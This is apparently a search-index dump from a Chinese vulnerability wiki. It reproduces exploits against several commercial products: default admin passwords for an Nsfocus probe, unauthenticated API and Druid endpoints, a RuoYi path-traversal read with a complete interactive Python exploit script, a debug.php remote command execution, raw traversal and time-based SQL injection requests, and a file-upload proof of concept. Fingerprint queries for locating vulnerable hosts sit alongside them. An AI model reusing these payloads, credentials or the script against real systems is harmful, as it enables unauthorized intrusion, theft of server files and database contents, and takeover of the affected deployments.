","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 默认口令 admin/Nsfocus@123 auditor/auditor 登陆页面 验证POC /webapi/v1/system/accountmanage/account 这里出现了登录的账号以及加密的 PASS 登陆时的加密字段抓包修改为获取的就可以登陆系统 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网御星云 web防护系统 信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网御星云 web防护系统 存在信息泄露漏洞，通过访问特殊的Url获取部分敏感信息 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网御星云 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"网页防篡改系统\" ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 访问 http://xxx.xxx.xxx.xxx/API/ 部分 API请求 不需要登录即可访问获取信息，例如 /user/list ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91-web%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"若依管理系统 Druid未授权访问 ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:0:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞描述 若依管理系统使用了Druid 默认开启了匿名访问，导致未授权获取敏感信息 ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:1:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞影响 若依管理系统 ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:2:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"网络测绘 app=\"若依-管理系统\" ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:3:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞复现 源码中看到 pom.xml 文件中查看到引用了 阿里Druid 从 issues 中发现了默认存在的未授权访问 Url为 http://xxx.xxx.xxx.xxx/prod-api/druid/index.html ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:4:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"若依管理系统 后台任意文件读取 CNVD-2021-01931 ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/:0:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/"},{"categories":null,"content":"漏洞描述 若依管理系统是基于SpringBoot的权限管理系统,登录后台后可以读取服务器上的任意文件 ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/:1:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/"},{"categories":null,"content":"漏洞影响 RuoYi \u003c v4.5.1 ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/:2:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/"},{"categories":null,"content":"网络测绘 app=\"若依-管理系统\" ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/:3:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/"},{"categories":null,"content":"漏洞复现 登录后台后访问 Url https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd 访问后会下载文件 /etc/passwd 可以使用Burp抓包改变 /etc/passwd 为其他文件路径获取敏感信息 在新版本的修复中添加了过滤 ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/:4:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/"},{"categories":null,"content":"漏洞POC ✅POC使用需要后台的Cookie,读取的文件路径应为根路径 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: RuoYi \u003c v4.5.1 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie \u003e\u003e\u003e JSESSIONID=xxxxxx \\033[0m') print('+ \\033[36mFile \u003e\u003e\u003e /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":Cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}//common/download/resource?resource=/profile/../../../../etc/passwd \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: Filename = input(\"\\033[35mFile \u003e\u003e\u003e \\033[0m\") if Filename == \"exit\": sys.exit(0) else: POC_2(target_url, Cookie, Filename) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie, Filename): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../{}\".format(Filename) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":Cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) Cookie = str(input(\"\\033[35mCookie \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, Cookie) ","date":"0001-01-01","objectID":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/:5:0","tags":null,"title":"","uri":"/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cnvd-2021-01931/"},{"categories":null,"content":"蓝海卓越计费管理系统 debug.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 蓝海卓越计费管理系统 debug.php 存在命令调试页面，导致攻击者可以远程命令执行 ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 蓝海卓越计费管理系统 ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"蓝海卓越计费管理系统\" ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞代码 访问 debug.php页面 远程调试命令执行 ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"蓝海卓越计费管理系统 download.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 蓝海卓越计费管理系统 download.php文件存在任意文件读取漏洞，攻击者通过 ../ 遍历目录可以读取服务器上的敏感文件 ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 蓝海卓越计费管理系统 ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"蓝海卓越计费管理系统\" ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 出现漏洞的文件为 download.php ，其中 file参数 存在用户可控 发送如下请求包 GET /download.php?file=../../../../../etc/passwd HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=qkoqsiilc4dol8s4e9d7ta15g7; mylang=zh_s Connection: close ","date":"0001-01-01","objectID":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"辰信领创 辰信景云终端安全管理系统 login SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 辰信领创 辰信景云终端安全管理系统 login存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 辰信领创 辰信景云终端安全管理系统 ","date":"0001-01-01","objectID":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"辰信景云终端安全管理系统\" ","date":"0001-01-01","objectID":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /api/user/login captcha=\u0026password=21232f297a57a5a743894a0e4a801fc3\u0026username=admin'and(select*from(select+sleep(3))a)=' ","date":"0001-01-01","objectID":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B-%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金山 V8 V9 终端安全系统 文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-v9-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-v9-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 参考链接： https://forum.butian.net/share/76 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-v9-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-v9-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 在tools目录下的mange下存在一个upload.php。该文件可导致任意文件上传。 poc： POST /tools/manage/upload.php HTTP/1.1 HOST: target ... \u003c?php phpinfo(); ?\u003e 